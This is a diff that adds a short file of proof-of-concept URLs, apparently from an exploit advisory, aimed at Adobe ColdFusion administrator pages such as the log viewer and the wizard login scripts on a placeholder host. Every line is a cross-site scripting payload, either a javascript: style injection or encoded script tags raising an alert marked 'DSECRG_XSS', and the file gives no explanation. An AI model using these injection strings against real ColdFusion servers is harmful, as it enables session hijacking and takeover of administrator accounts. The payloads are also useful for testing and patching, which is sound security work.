@@ -1,0 +1,10 @@
+http://www.example.com:8500/CFIDE/administrator/logviewer/searchlog.cfm?viewShort=0&amp;sortBy=&amp;filter=CurrentFilter&amp;startRow=22%22%20%20STYLE=%22background-image:url(javascript:alert(%27%DF%20%E7%E4%E5%F1%FC%20%E1%FB%EB%27))%22%3E
+
+
+http://www.example.com:8500/CFIDE/wizards/common/_logintowizard.cfm?&gt;&#039;&quot;&gt;&lt;script&gt;alert(&#039;DSECRG_XSS&#039;)&lt;/script&gt;
+
+
+http://www.example.com:8500/CFIDE/wizards/common/_authenticatewizarduser.cfm?&gt;&#039;&quot;&gt;&lt;script&gt;alert(&#039;DSECRG_XSS&#039;)&lt;/script&gt;
+
+
+http://www.example.com:8500/CFIDE/administrator/enter.cfm?&gt;&#039;&quot;&gt;&lt;script&gt;alert(&#039;DSECRG_XSS&#039;)&lt;/script&gt;
